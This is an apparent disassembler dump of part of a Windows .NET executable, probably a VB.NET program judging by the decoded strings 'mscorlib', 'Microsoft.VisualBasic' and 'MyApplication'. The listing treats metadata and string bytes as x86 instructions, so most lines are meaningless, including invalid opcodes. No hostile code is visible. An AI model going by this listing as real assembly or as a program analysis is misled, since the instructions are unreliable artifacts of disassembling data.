  40753a:	e7 04                	out    %eax,$0x4
  40753c:	d6                   	salc
  40753d:	08 51 04             	or     %dl,0x4(%ecx)
  407540:	46                   	inc    %esi
  407541:	01 ee                	add    %ebp,%esi
  407543:	08 89 01 75 0f e5    	or     %cl,-0x1af08aff(%ecx)
  407549:	00 69 04             	add    %ch,0x4(%ecx)
  40754c:	59                   	pop    %ecx
  40754d:	1b f7                	sbb    %edi,%esi
  40754f:	08 b1 01 65 1b fc    	or     %dh,-0x3e49aff(%ecx)
  407555:	08 61 01             	or     %ah,0x1(%ecx)
  407558:	71 1b                	jno    0x407575
  40755a:	b0 03                	mov    $0x3,%al
  40755c:	99                   	cltd
  40755d:	01 84 1b d5 00 61 04 	add    %eax,0x46100d5(%ebx,%ebx,1)
  407564:	46                   	inc    %esi
  407565:	01 bd 02 71 04 9f    	add    %edi,-0x60fb8efe(%ebp)
  40756b:	1b bd 02 69 03 a9    	sbb    -0x56fc96fe(%ebp),%edi
  407571:	1b d5                	sbb    %ebp,%edx
  407573:	00 69 03             	add    %ch,0x3(%ecx)
  407576:	b9 1b d5 00 61       	mov    $0x6100d51b,%ecx
  40757b:	01 cc                	add    %ecx,%esp
  40757d:	1b b0 03 61 01 dc    	sbb    -0x23fe9efd(%eax),%esi
  407583:	1b b0 03 21 02 f0    	sbb    -0xffddefd(%eax),%esi
  407589:	1b 09                	sbb    (%ecx),%ecx
  40758b:	01 69 03             	add    %ebp,0x3(%ecx)
  40758e:	f5                   	cmc
  40758f:	1b 17                	sbb    (%edi),%edx
  407591:	00 59 01             	add    %bl,0x1(%ecx)
  407594:	f9                   	stc
  407595:	1b 71 00             	sbb    0x0(%ecx),%esi
  407598:	21 02                	and    %eax,(%edx)
  40759a:	09 1c 29             	or     %ebx,(%ecx,%ebp,1)
  40759d:	09 21                	or     %esp,(%ecx)
  40759f:	02 15 1c 2e 09 79    	add    0x79092e1c,%dl
  4075a5:	04 29                	add    $0x29,%al
  4075a7:	1c 34                	sbb    $0x34,%al
  4075a9:	09 21                	or     %esp,(%ecx)
  4075ab:	01 33                	add    %esi,(%ebx)
  4075ad:	1c 39                	sbb    $0x39,%al
  4075af:	09 21                	or     %esp,(%ecx)
  4075b1:	01 ba 0f 3e 09 21    	add    %edi,0x21093e0f(%edx)
  4075b7:	01 03                	add    %eax,(%ebx)
  4075b9:	0e                   	push   %cs
  4075ba:	43                   	inc    %ebx
  4075bb:	09 a9 00 5d 02 71    	or     %ebp,0x71025d00(%ecx)
  4075c1:	00 61 04             	add    %ah,0x4(%ecx)
  4075c4:	46                   	inc    %esi
  4075c5:	01 fc                	add    %edi,%esp
  4075c7:	08 19                	or     %bl,(%ecx)
  4075c9:	00 3b                	add    %bh,(%ebx)
  4075cb:	02 48 09             	add    0x9(%eax),%cl
  4075ce:	71 04                	jno    0x4075d4
  4075d0:	c2 15 22             	ret    $0x2215
  4075d3:	07                   	pop    %es
  4075d4:	69 01 43 1c d5 00    	imul   $0xd51c43,(%ecx),%eax
  4075da:	59                   	pop    %ecx
  4075db:	01 56 1c             	add    %edx,0x1c(%esi)
  4075de:	64 09 31             	or     %esi,%fs:(%ecx)
  4075e1:	01 65 1c             	add    %esp,0x1c(%ebp)
  4075e4:	9f                   	lahf
  4075e5:	01 91 04 46 01 13    	add    %edx,0x13014604(%ecx)
  4075eb:	00 99 04 46 01 2b    	add    %bl,0x2b014604(%ecx)
  4075f1:	02 a1 04 b7 1c 78    	add    0x781cb704(%ecx),%ah
  4075f7:	09 59 01             	or     %ebx,0x1(%ecx)
  4075fa:	c9                   	leave
  4075fb:	1c 17                	sbb    $0x17,%al
  4075fd:	00 a9 04 46 01 13    	add    %ch,0x13014604(%ecx)
  407603:	00 b9 04 46 01 13    	add    %bh,0x13014604(%ecx)
  407609:	00 c1                	add    %al,%cl
  40760b:	04 5f                	add    $0x5f,%al
  40760d:	1d 88 09 c9 04       	sbb    $0x4c90988,%eax
  407612:	71 1d                	jno    0x407631
  407614:	8f 09 d1 04          	(bad)
  407618:	89 1d 9c 09 d1 04    	mov    %ebx,0x4d1099c
  40761e:	9c                   	pushf
  40761f:	1d a2 09 d1 04       	sbb    $0x4d109a2,%eax
  407624:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407625:	1d a9 09 b1 04       	sbb    $0x4b109a9,%eax
  40762a:	b5 1d                	mov    $0x1d,%ch
  40762c:	af                   	scas   %es:(%edi),%eax
  40762d:	09 e1                	or     %esp,%ecx
  40762f:	01 c9                	add    %ecx,%ecx
  407631:	1d 71 00 81 00       	sbb    $0x810071,%eax
  407636:	46                   	inc    %esi
  407637:	01 cc                	add    %ecx,%esp
  407639:	09 e1                	or     %esp,%ecx
  40763b:	04 ea                	add    $0xea,%al
  40763d:	1d d6 09 61 00       	sbb    $0x6109d6,%eax
  407642:	46                   	inc    %esi
  407643:	01 89 05 31 01 f8    	add    %ecx,-0x7fecefb(%ecx)
  407649:	1d dd 09 61 00       	sbb    $0x6109dd,%eax
  40764e:	f6 14 e2             	notb   (%edx,%eiz,8)
  407651:	09 79 04             	or     %edi,0x4(%ecx)
  407654:	02 1e                	add    (%esi),%bl
  407656:	f0 09 69 01          	lock or %ebp,0x1(%ecx)
  40765a:	09 1e                	or     %ebx,(%esi)
  40765c:	f1                   	int1
  40765d:	01 81 00 c2 19 fc    	add    %eax,-0x3e63e00(%ecx)
  407663:	09 49 04             	or     %ecx,0x4(%ecx)
  407666:	17                   	pop    %ss
  407667:	1e                   	push   %ds
  407668:	14 0a                	adc    $0xa,%al
  40766a:	69 01 21 1e f1 01    	imul   $0x1f11e21,(%ecx),%eax
  407670:	69 01 34 1e d5 00    	imul   $0xd51e34,(%ecx),%eax
  407676:	99                   	cltd
  407677:	01 48 1e             	add    %ecx,0x1e(%eax)
  40767a:	14 02                	adc    $0x2,%al
  40767c:	f1                   	int1
  40767d:	04 46                	add    $0x46,%al
  40767f:	01 bd 02 f1 04 5e    	add    %edi,0x5e04f102(%ebp)
  407685:	1e                   	push   %ds
  407686:	a1 06 49 04 72       	mov    0x72044906,%eax
  40768b:	1e                   	push   %ds
  40768c:	ca 08 79             	lret   $0x7908
  40768f:	02 5d 02             	add    0x2(%ebp),%bl
  407692:	01 05 31 01 7c 1e    	add    %eax,0x1e7c0131
  407698:	71 00                	jno    0x40769a
  40769a:	b1 01                	mov    $0x1,%cl
  40769c:	9f                   	lahf
  40769d:	1e                   	push   %ds
  40769e:	2f                   	das
  40769f:	0a b1 01 84 0a 39    	or     0x390a8401(%ecx),%dh
  4076a5:	0a b1 01 9f 1e 4c    	or     0x4c1e9f01(%ecx),%dh
  4076ab:	0a b1 01 93 0a 1b    	or     0x1b0a9301(%ecx),%dh
  4076b1:	06                   	push   %es
  4076b2:	39 00                	cmp    %eax,(%eax)
  4076b4:	46                   	inc    %esi
  4076b5:	01 9c 09 11 05 82 12 	add    %ebx,0x12820511(%ecx,%ecx,1)
  4076bc:	5f                   	pop    %edi
  4076bd:	0a 19                	or     (%ecx),%bl
  4076bf:	05 46 01 66 0a       	add    $0xa660146,%eax
  4076c4:	11 02                	adc    %eax,(%edx)
  4076c6:	fc                   	cld
  4076c7:	1e                   	push   %ds
  4076c8:	45                   	inc    %ebp
  4076c9:	06                   	push   %es
  4076ca:	11 05 0c 1b 81 0a    	adc    %eax,0xa811b0c
  4076d0:	d1 04 0b             	roll   $1,(%ebx,%ecx,1)
  4076d3:	1f                   	pop    %ds
  4076d4:	a9 09 89 00 46       	test   $0x46008909,%eax
  4076d9:	01 a8 0a 29 02 37    	add    %ebp,0x3702290a(%eax)
  4076df:	16                   	push   %ss
  4076e0:	13 00                	adc    (%eax),%eax
  4076e2:	29 05 46 01 b0 0a    	sub    %eax,0xab00146
  4076e8:	39 05 46 01 89 05    	cmp    %eax,0x5890146
  4076ee:	41                   	inc    %ecx
  4076ef:	05 46 01 13 00       	add    $0x130146,%eax
  4076f4:	49                   	dec    %ecx
  4076f5:	05 46 01 bd 02       	add    $0x2bd0146,%eax
  4076fa:	51                   	push   %ecx
  4076fb:	05 46 01 bd 02       	add    $0x2bd0146,%eax
  407700:	59                   	pop    %ecx
  407701:	05 46 01 bd 02       	add    $0x2bd0146,%eax
  407706:	61                   	popa
  407707:	05 46 01 bd 02       	add    $0x2bd0146,%eax
  40770c:	69 05 46 01 bd 02 71 	imul   $0x1460571,0x2bd0146,%eax
  407713:	05 46 01 
  407716:	bd 02 79 05 46       	mov    $0x46057902,%ebp
  40771b:	01 bd 02 81 05 46    	add    %edi,0x46058102(%ebp)
  407721:	01 bd 02 08 00 8c    	add    %edi,-0x73fff7fe(%ebp)
  407727:	00 3e                	add    %bh,(%esi)
  407729:	01 0e                	add    %ecx,(%esi)
  40772b:	00 a4 00 a8 01 09 00 	add    %ah,0x901a8(%eax,%eax,1)
  407732:	dc 00                	faddl  (%eax)
  407734:	50                   	push   %eax
  407735:	02 09                	add    (%ecx),%cl
  407737:	00 e0                	add    %ah,%al
  407739:	00 55 02             	add    %dl,0x2(%ebp)
  40773c:	09 00                	or     %eax,(%eax)
  40773e:	e4 00                	in     $0x0,%al
  407740:	5a                   	pop    %edx
  407741:	02 29                	add    (%ecx),%ch
  407743:	00 83 00 e3 02 2e    	add    %al,0x2e02e300(%ebx)
  407749:	00 23                	add    %ah,(%ebx)
  40774b:	0a b5 03 2e 00 f3    	or     -0xcffd1fd(%ebp),%dh
  407751:	09 b9 0a 2e 00 1b    	or     %edi,0x1b002e0a(%ecx)
  407757:	0a b5 03 2e 00 33    	or     0x33002e03(%ebp),%dh
  40775d:	0a b5 03 2e 00 3b    	or     0x3b002e03(%ebp),%dh
  407763:	0a b5 03 2e 00 2b    	or     0x2b002e03(%ebp),%dh
  407769:	0a b5 03 2e 00 fb    	or     -0x4ffd1fd(%ebp),%dh
  40776f:	09 c2                	or     %eax,%edx
  407771:	0a 2e                	or     (%esi),%ch
  407773:	00 03                	add    %al,(%ebx)
  407775:	0a e1                	or     %cl,%ah
  407777:	0a 2e                	or     (%esi),%ch
  407779:	00 0b                	add    %cl,(%ebx)
  40777b:	0a 0b                	or     (%ebx),%cl
  40777d:	0b 2e                	or     (%esi),%ebp
  40777f:	00 13                	add    %dl,(%ebx)
  407781:	0a b5 03 40 00 2b    	or     0x2b004003(%ebp),%dh
  407787:	00 5a 02             	add    %bl,0x2(%edx)
  40778a:	40                   	inc    %eax
  40778b:	00 13                	add    %dl,(%ebx)
  40778d:	00 65 02             	add    %ah,0x2(%ebp)
  407790:	43                   	inc    %ebx
  407791:	00 13                	add    %dl,(%ebx)
  407793:	00 65 02             	add    %ah,0x2(%ebp)
  407796:	43                   	inc    %ebx
  407797:	00 1b                	add    %bl,(%ebx)
  407799:	00 74 02 49          	add    %dh,0x49(%edx,%eax,1)
  40779d:	00 83 00 f4 02 63    	add    %al,0x6302f400(%ebx)
  4077a3:	00 13                	add    %dl,(%ebx)
  4077a5:	00 65 02             	add    %ah,0x2(%ebp)
  4077a8:	63 00                	arpl   %eax,(%eax)
  4077aa:	1b 00                	sbb    (%eax),%eax
  4077ac:	74 02                	je     0x4077b0
  4077ae:	69 00 83 00 c2 02    	imul   $0x2c20083,(%eax),%eax
  4077b4:	80 00 2b             	addb   $0x2b,(%eax)
  4077b7:	00 5a 02             	add    %bl,0x2(%edx)
  4077ba:	83 00 7b             	addl   $0x7b,(%eax)
  4077bd:	00 5a 02             	add    %bl,0x2(%edx)
  4077c0:	83 00 73             	addl   $0x73,(%eax)
  4077c3:	00 5a 02             	add    %bl,0x2(%edx)
  4077c6:	83 00 1b             	addl   $0x1b,(%eax)
  4077c9:	00 74 02 89          	add    %dh,-0x77(%edx,%eax,1)
  4077cd:	00 83 00 cf 02 a0    	add    %al,-0x5ffd3100(%ebx)
  4077d3:	00 2b                	add    %ch,(%ebx)
  4077d5:	00 5a 02             	add    %bl,0x2(%edx)
  4077d8:	a1 00 db 00 5a       	mov    0x5a00db00,%eax
  4077dd:	02 a1 00 e3 00 5a    	add    0x5a00e300(%ecx),%ah
  4077e3:	02 a3 00 13 00 65    	add    0x65001300(%ebx),%ah
  4077e9:	02 a3 00 c3 00 3d    	add    0x3d00c300(%ebx),%ah
  4077ef:	03 c0                	add    %eax,%eax
  4077f1:	00 2b                	add    %ch,(%ebx)
  4077f3:	00 5a 02             	add    %bl,0x2(%edx)
  4077f6:	c3                   	ret
  4077f7:	00 13                	add    %dl,(%ebx)
  4077f9:	00 65 02             	add    %ah,0x2(%ebp)
  4077fc:	c3                   	ret
  4077fd:	00 d3                	add    %dl,%bl
  4077ff:	00 b5 03 e0 00 2b    	add    %dh,0x2b00e003(%ebp)
  407805:	00 5a 02             	add    %bl,0x2(%edx)
  407808:	00 01                	add    %al,(%ecx)
  40780a:	13 00                	adc    (%eax),%eax
  40780c:	65 02 00             	add    %gs:(%eax),%al
  40780f:	01 2b                	add    %ebp,(%ebx)
  407811:	00 5a 02             	add    %bl,0x2(%edx)
  407814:	20 01                	and    %al,(%ecx)
  407816:	13 00                	adc    (%eax),%eax
  407818:	65 02 20             	add    %gs:(%eax),%ah
  40781b:	01 2b                	add    %ebp,(%ebx)
  40781d:	00 5a 02             	add    %bl,0x2(%edx)
  407820:	40                   	inc    %eax
  407821:	01 13                	add    %edx,(%ebx)
  407823:	00 65 02             	add    %ah,0x2(%ebp)
  407826:	40                   	inc    %eax
  407827:	01 2b                	add    %ebp,(%ebx)
  407829:	00 5a 02             	add    %bl,0x2(%edx)
  40782c:	60                   	pusha
  40782d:	01 13                	add    %edx,(%ebx)
  40782f:	00 65 02             	add    %ah,0x2(%ebp)
  407832:	60                   	pusha
  407833:	01 2b                	add    %ebp,(%ebx)
  407835:	00 5a 02             	add    %bl,0x2(%edx)
  407838:	80 01 2b             	addb   $0x2b,(%ecx)
  40783b:	00 5a 02             	add    %bl,0x2(%edx)
  40783e:	a0 01 2b 00 5a       	mov    0x5a002b01,%al
  407843:	02 c0                	add    %al,%al
  407845:	01 13                	add    %edx,(%ebx)
  407847:	00 65 02             	add    %ah,0x2(%ebp)
  40784a:	c0 01 2b             	rolb   $0x2b,(%ecx)
  40784d:	00 5a 02             	add    %bl,0x2(%edx)
  407850:	e0 01                	loopne 0x407853
  407852:	2b 00                	sub    (%eax),%eax
  407854:	5a                   	pop    %edx
  407855:	02 e3                	add    %bl,%ah
  407857:	01 73 00             	add    %esi,0x0(%ebx)
  40785a:	5a                   	pop    %edx
  40785b:	02 00                	add    (%eax),%al
  40785d:	02 13                	add    (%ebx),%dl
  40785f:	00 65 02             	add    %ah,0x2(%ebp)
  407862:	00 02                	add    %al,(%edx)
  407864:	2b 00                	sub    (%eax),%eax
  407866:	5a                   	pop    %edx
  407867:	02 63 02             	add    0x2(%ebx),%ah
  40786a:	e3 00                	jecxz  0x40786c
  40786c:	5a                   	pop    %edx
  40786d:	02 63 02             	add    0x2(%ebx),%ah
  407870:	03 01                	add    (%ecx),%eax
  407872:	d4 03                	aam    $0x3
  407874:	80 02 23             	addb   $0x23,(%edx)
  407877:	03 5a 02             	add    0x2(%edx),%ebx
  40787a:	83 02 e3             	addl   $0xffffffe3,(%edx)
  40787d:	00 5a 02             	add    %bl,0x2(%edx)
  407880:	c0 03 e3             	rolb   $0xe3,(%ebx)
  407883:	00 5a 02             	add    %bl,0x2(%edx)
  407886:	e0 03                	loopne 0x40788b
  407888:	0b 01                	or     (%ecx),%eax
  40788a:	5a                   	pop    %edx
  40788b:	02 e0                	add    %al,%ah
  40788d:	03 e3                	add    %ebx,%esp
  40788f:	00 5a 02             	add    %bl,0x2(%edx)
  407892:	00 04 e3             	add    %al,(%ebx,%eiz,8)
  407895:	00 5a 02             	add    %bl,0x2(%edx)
  407898:	80 06 e3             	addb   $0xe3,(%esi)
  40789b:	00 5a 02             	add    %bl,0x2(%edx)
  40789e:	80 06 0b             	addb   $0xb,(%esi)
  4078a1:	01 5a 02             	add    %ebx,0x2(%edx)
  4078a4:	a0 06 e3 00 5a       	mov    0x5a00e306,%al
  4078a9:	02 a0 06 0b 01 5a    	add    0x5a010b06(%eax),%ah
  4078af:	02 60 08             	add    0x8(%eax),%ah
  4078b2:	e3 00                	jecxz  0x4078b4
  4078b4:	5a                   	pop    %edx
  4078b5:	02 60 08             	add    0x8(%eax),%ah
  4078b8:	0b 01                	or     (%ecx),%eax
  4078ba:	5a                   	pop    %edx
  4078bb:	02 80 08 0b 01 5a    	add    0x5a010b08(%eax),%al
  4078c1:	02 80 08 e3 00 5a    	add    0x5a00e308(%eax),%al
  4078c7:	02 20                	add    (%eax),%ah
  4078c9:	10 e3                	adc    %ah,%bl
  4078cb:	00 5a 02             	add    %bl,0x2(%edx)
  4078ce:	41                   	inc    %ecx
  4078cf:	00 f5                	add    %dh,%ch
  4078d1:	08 45 00             	or     %al,0x0(%ebp)
  4078d4:	f5                   	cmc
  4078d5:	08 68 00             	or     %ch,0x0(%eax)
  4078d8:	b7 0a                	mov    $0xa,%bh
  4078da:	6a 00                	push   $0x0
  4078dc:	b7 0a                	mov    $0xa,%bh
  4078de:	87 00                	xchg   %eax,(%eax)
  4078e0:	76 09                	jbe    0x4078eb
  4078e2:	93                   	xchg   %eax,%ebx
  4078e3:	00 86 09 95 00 86    	add    %al,-0x79ff6af7(%esi)
  4078e9:	09 97 00 86 09 a9    	or     %edx,-0x56f67a00(%edi)
  4078ef:	02 ae 02 b3 02 b8    	add    -0x47fd4cfe(%esi),%ch
  4078f5:	02 0d 03 11 03 1c    	add    0x1c031103,%cl
  4078fb:	03 21                	add    (%ecx),%esp
  4078fd:	03 30                	add    (%eax),%esi
  4078ff:	03 30                	add    (%eax),%esi
  407901:	03 ab 03 ba 04 f6    	add    -0x9fb45fd(%ebx),%ebp
  407907:	04 0b                	add    $0xb,%al
  407909:	05 0d 03 2e 05       	add    $0x52e030d,%eax
  40790e:	41                   	inc    %ecx
  40790f:	05 46 05 65 05       	add    $0x5650546,%eax
  407914:	ad                   	lods   %ds:(%esi),%eax
  407915:	05 c9 05 d9 05       	add    $0x5d905c9,%eax
  40791a:	e6 05                	out    %al,$0x5
  40791c:	01 06                	add    %eax,(%esi)
  40791e:	2c 06                	sub    $0x6,%al
  407920:	4b                   	dec    %ebx
  407921:	06                   	push   %es
  407922:	5c                   	pop    %esp
  407923:	06                   	push   %es
  407924:	7a 06                	jp     0x40792c
  407926:	ac                   	lods   %ds:(%esi),%al
  407927:	06                   	push   %es
  407928:	b6 06                	mov    $0x6,%dh
  40792a:	cb                   	lret
  40792b:	06                   	push   %es
  40792c:	b6 06                	mov    $0x6,%dh
  40792e:	d9 06                	flds   (%esi)
  407930:	e8 06 87 07 ed       	call   0xed48003b
  407935:	07                   	pop    %es
  407936:	b6 06                	mov    $0x6,%dh
  407938:	b6 06                	mov    $0x6,%dh
  40793a:	17                   	pop    %ss
  40793b:	08 60 08             	or     %ah,0x8(%eax)
  40793e:	83 08 8c             	orl    $0xffffff8c,(%eax)
  407941:	08 96 08 ba 08 e1    	or     %dl,-0x1ef745f8(%esi)
  407947:	08 02                	or     %al,(%edx)
  407949:	09 22                	or     %esp,(%edx)
  40794b:	09 4e 09             	or     %ecx,0x9(%esi)
  40794e:	5a                   	pop    %edx
  40794f:	09 6b 09             	or     %ebp,0x9(%ebx)
  407952:	7f 09                	jg     0x40795d
  407954:	7f 09                	jg     0x40795f
  407956:	b8 09 d1 09 0d       	mov    $0xd09d109,%eax
  40795b:	03 e8                	add    %eax,%ebp
  40795d:	09 11                	or     %edx,(%ecx)
  40795f:	03 03                	add    (%ebx),%eax
  407961:	0a 9c 00 08 0a 0f 0a 	or     0xa0f0a08(%eax,%eax,1),%bl
  407968:	21 03                	and    %eax,(%ebx)
  40796a:	1a 0a                	sbb    (%edx),%cl
  40796c:	20 0a                	and    %cl,(%edx)
  40796e:	42                   	inc    %edx
  40796f:	0a 53 0a             	or     0xa(%ebx),%dl
  407972:	70 0a                	jo     0x40797e
  407974:	87 0a                	xchg   %ecx,(%edx)
  407976:	95                   	xchg   %eax,%ebp
  407977:	0a 95 0a 41 05 04    	or     0x405410a(%ebp),%dl
  40797d:	00 01                	add    %al,(%ecx)
  40797f:	00 06                	add    %al,(%esi)
  407981:	00 05 00 00 00 6a    	add    %al,0x6a000000
  407987:	01 4f 00             	add    %ecx,0x0(%edi)
  40798a:	00 00                	add    %al,(%eax)
  40798c:	23 02                	and    (%edx),%eax
  40798e:	54                   	push   %esp
  40798f:	00 00                	add    %al,(%eax)
  407991:	00 d2                	add    %dl,%dl
  407993:	01 59 00             	add    %ebx,0x0(%ecx)
  407996:	00 00                	add    %al,(%eax)
  407998:	2f                   	das
  407999:	02 5e 00             	add    0x0(%esi),%bl
  40799c:	00 00                	add    %al,(%eax)
  40799e:	bc 02 94 00 02       	mov    $0x2009402,%esp
  4079a3:	00 04 00             	add    %al,(%eax,%eax,1)
  4079a6:	03 00                	add    (%eax),%eax
  4079a8:	02 00                	add    (%eax),%al
  4079aa:	05 00 05 00 02       	add    $0x2000500,%eax
  4079af:	00 06                	add    %al,(%esi)
  4079b1:	00 07                	add    %al,(%edi)
  4079b3:	00 02                	add    %al,(%edx)
  4079b5:	00 07                	add    %al,(%edi)
  4079b7:	00 09                	add    %cl,(%ecx)
  4079b9:	00 02                	add    %al,(%edx)
  4079bb:	00 0f                	add    %cl,(%edi)
  4079bd:	00 0b                	add    %cl,(%ebx)
  4079bf:	00 c8                	add    %cl,%al
  4079c1:	12 15 1b 78 1c d8    	adc    0xd81c781b,%dl
  4079c7:	1c 1b                	sbb    $0x1b,%al
  4079c9:	1f                   	pop    %ds
  4079ca:	75 00                	jne    0x4079cc
  4079cc:	75 00                	jne    0x4079ce
  4079ce:	88 00                	mov    %al,(%eax)
  4079d0:	8d 02                	lea    (%edx),%eax
  4079d2:	94                   	xchg   %eax,%esp
  4079d3:	02 9b 02 a2 02 9f    	add    -0x60fd5dfe(%ebx),%bl
  4079d9:	03 f0                	add    %eax,%esi
  4079db:	06                   	push   %es
  4079dc:	2c 08                	sub    $0x8,%al
  4079de:	40                   	inc    %eax
  4079df:	08 00                	or     %al,(%eax)
  4079e1:	01 39                	add    %edi,(%ecx)
  4079e3:	00 71 03             	add    %dh,0x3(%ecx)
  4079e6:	01 00                	add    %eax,(%eax)
  4079e8:	41                   	inc    %ecx
  4079e9:	01 3b                	add    %edi,(%ebx)
  4079eb:	00 8e 03 01 00 00    	add    %cl,0x103(%esi)
  4079f1:	01 7d 00             	add    %edi,0x0(%ebp)
  4079f4:	82 05 02 00 43 01 7f 	addb   $0x7f,0x1430002
  4079fb:	00 da                	add    %bl,%dl
  4079fd:	05 02 00 46 01       	add    $0x1460002,%eax
  407a02:	9d                   	popf
  407a03:	00 df                	add    %bl,%bh
  407a05:	06                   	push   %es
  407a06:	03 00                	add    (%eax),%eax
  407a08:	46                   	inc    %esi
  407a09:	01 9f 00 0c 07 03    	add    %ebx,0x3070c00(%edi)
  407a0f:	00 46 01             	add    %al,0x1(%esi)
  407a12:	a1 00 24 07 03       	mov    0x3072400,%eax
  407a17:	00 46 01             	add    %al,0x1(%esi)
  407a1a:	a3 00 71 03 01       	mov    %eax,0x1037100
  407a1f:	00 00                	add    %al,(%eax)
  407a21:	01 a5 00 40 07 03    	add    %esp,0x3074000(%ebp)
  407a27:	00 40 01             	add    %al,0x1(%eax)
  407a2a:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  407a2b:	00 54 07 03          	add    %dl,0x3(%edi,%eax,1)
  407a2f:	00 07                	add    %al,(%edi)
  407a31:	01 a9 00 80 07 03    	add    %ebp,0x3078000(%ecx)
  407a37:	00 40 01             	add    %al,0x1(%eax)
  407a3a:	ab                   	stos   %eax,%es:(%edi)
  407a3b:	00 94 07 03 00 00 01 	add    %dl,0x1000003(%edi,%eax,1)
  407a42:	ad                   	lods   %ds:(%esi),%eax
  407a43:	00 b0 07 03 00 00    	add    %dh,0x307(%eax)
  407a49:	01 af 00 e5 07 03    	add    %ebp,0x307e500(%edi)
  407a4f:	00 00                	add    %al,(%eax)
  407a51:	01 b1 00 22 08 03    	add    %esi,0x3082200(%ecx)
  407a57:	00 40 01             	add    %al,0x1(%eax)
  407a5a:	b5 00                	mov    $0x0,%ch
  407a5c:	e2 1c                	loop   0x407a7a
  407a5e:	04 00                	add    $0x0,%al
  407a60:	40                   	inc    %eax
  407a61:	01 c3                	add    %eax,%ebx
  407a63:	00 23                	add    %ah,(%ebx)
  407a65:	09 05 00 00 01 c9    	or     %eax,0xc9010000
  407a6b:	00 a3 09 03 00 00    	add    %ah,0x309(%ebx)
  407a71:	01 cf                	add    %ecx,%edi
  407a73:	00 40 07             	add    %al,0x7(%eax)
  407a76:	03 00                	add    (%eax),%eax
  407a78:	00 01                	add    %al,(%ecx)
  407a7a:	d1 00                	roll   $1,(%eax)
  407a7c:	20 0a                	and    %cl,(%edx)
  407a7e:	03 00                	add    (%eax),%eax
  407a80:	40                   	inc    %eax
  407a81:	01 d3                	add    %edx,%ebx
  407a83:	00 39                	add    %bh,(%ecx)
  407a85:	0a 01                	or     (%ecx),%al
  407a87:	00 04 80             	add    %al,(%eax,%eax,4)
  407a8a:	00 00                	add    %al,(%eax)
  407a8c:	01 00                	add    %eax,(%eax)
	...
  407a9a:	4c                   	dec    %esp
  407a9b:	20 00                	and    %al,(%eax)
  407a9d:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  407aa8:	00 00                	add    %al,(%eax)
  407aaa:	01 00                	add    %eax,(%eax)
  407aac:	0a 00                	or     (%eax),%al
  407aae:	00 00                	add    %al,(%eax)
  407ab0:	00 00                	add    %al,(%eax)
  407ab2:	0a 00                	or     (%eax),%al
	...
  407abc:	00 00                	add    %al,(%eax)
  407abe:	0a 00                	or     (%eax),%al
  407ac0:	13 00                	adc    (%eax),%eax
  407ac2:	00 00                	add    %al,(%eax)
  407ac4:	00 00                	add    %al,(%eax)
  407ac6:	04 00                	add    $0x0,%al
	...
  407ad0:	00 00                	add    %al,(%eax)
  407ad2:	01 00                	add    %eax,(%eax)
  407ad4:	73 01                	jae    0x407ad7
  407ad6:	00 00                	add    %al,(%eax)
  407ad8:	00 00                	add    %al,(%eax)
  407ada:	04 00                	add    $0x0,%al
	...
  407ae4:	00 00                	add    %al,(%eax)
  407ae6:	0a 00                	or     (%eax),%al
  407ae8:	cc                   	int3
  407ae9:	11 00                	adc    %eax,(%eax)
  407aeb:	00 00                	add    %al,(%eax)
  407aed:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  407af8:	00 00                	add    %al,(%eax)
  407afa:	0a 00                	or     (%eax),%al
  407afc:	97                   	xchg   %eax,%edi
  407afd:	16                   	push   %ss
  407afe:	00 00                	add    %al,(%eax)
  407b00:	00 00                	add    %al,(%eax)
  407b02:	04 00                	add    $0x0,%al
	...
  407b0c:	00 00                	add    %al,(%eax)
  407b0e:	01 00                	add    %eax,(%eax)
  407b10:	db 16                	fistl  (%esi)
  407b12:	00 00                	add    %al,(%eax)
  407b14:	00 00                	add    %al,(%eax)
  407b16:	04 00                	add    $0x0,%al
	...
  407b20:	00 00                	add    %al,(%eax)
  407b22:	01 00                	add    %eax,(%eax)
  407b24:	fc                   	cld
  407b25:	19 00                	sbb    %eax,(%eax)
  407b27:	00 00                	add    %al,(%eax)
  407b29:	00 05 00 04 00 06    	add    %al,0x6000400
  407b2f:	00 04 00             	add    %al,(%eax,%eax,1)
  407b32:	10 00                	adc    %al,(%eax)
  407b34:	0c 00                	or     $0x0,%al
  407b36:	11 00                	adc    %eax,(%eax)
  407b38:	0f 00 12             	lldt   (%edx)
  407b3b:	00 0f                	add    %cl,(%edi)
  407b3d:	00 14 00             	add    %dl,(%eax,%eax,1)
  407b40:	0a 00                	or     (%eax),%al
  407b42:	00 00                	add    %al,(%eax)
  407b44:	10 00                	adc    %al,(%eax)
  407b46:	0c 00                	or     $0x0,%al
  407b48:	79 02                	jns    0x407b4c
  407b4a:	00 00                	add    %al,(%eax)
  407b4c:	10 00                	adc    %al,(%eax)
  407b4e:	19 00                	sbb    %eax,(%eax)
  407b50:	79 02                	jns    0x407b54
  407b52:	00 00                	add    %al,(%eax)
  407b54:	00 00                	add    %al,(%eax)
  407b56:	1b 00                	sbb    (%eax),%eax
  407b58:	79 02                	jns    0x407b5c
  407b5a:	2d 00 2b 03 2d       	sub    $0x2d032b00,%eax
  407b5f:	00 a6 03 cf 01 5c    	add    %ah,0x5c01cf03(%esi)
  407b65:	08 4b 02             	or     %cl,0x2(%ebx)
  407b68:	f7 09 00 00 00 3c    	testl  $0x3c000000,(%ecx)
  407b6e:	4d                   	dec    %ebp
  407b6f:	6f                   	outsl  %ds:(%esi),(%dx)
  407b70:	64 75 6c             	fs jne 0x407bdf
  407b73:	65 3e 00 6d 73       	gs add %ch,%ds:0x73(%ebp)
  407b78:	63 6f 72             	arpl   %ebp,0x72(%edi)
  407b7b:	6c                   	insb   (%dx),%es:(%edi)
  407b7c:	69 62 00 4d 69 63 72 	imul   $0x7263694d,0x0(%edx),%esp
  407b83:	6f                   	outsl  %ds:(%esi),(%dx)
  407b84:	73 6f                	jae    0x407bf5
  407b86:	66 74 2e             	data16 je 0x407bb7
  407b89:	56                   	push   %esi
  407b8a:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  407b91:	73 69                	jae    0x407bfc
  407b93:	63 00                	arpl   %eax,(%eax)
  407b95:	4d                   	dec    %ebp
  407b96:	79 41                	jns    0x407bd9
  407b98:	70 70                	jo     0x407c0a
  407b9a:	6c                   	insb   (%dx),%es:(%edi)
  407b9b:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  407ba2:	00 4d 79             	add    %cl,0x79(%ebp)
